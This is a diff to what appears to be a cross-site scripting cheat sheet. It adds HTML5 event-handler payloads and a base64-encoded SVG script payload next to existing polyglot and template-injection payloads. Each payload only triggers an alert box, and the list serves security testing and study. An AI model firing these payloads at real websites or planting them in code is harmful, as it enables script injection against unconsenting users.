@@ -9,6 +9,14 @@ JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Scri
 "style="position:fixed;top:0;left:0;border:999em solid green;" onmouseover="alert(document.domain)"
 {{_c.constructor('alert(1)')()}}
 {{constructor.constructor('alert(1)')()}}
+<body onpageshow=alert(1)>
+<details open ontoggle="alert()">
+
+HTML5 payloads
+<video autoplay onloadstart="alert()" src=x></video>
+<audio autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
+<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
+
 ```
 #### XSS escalation
 `https://www.bugcrowd.com/blog/the-ultimate-guide-to-finding-and-escalating-xss-bugs/`
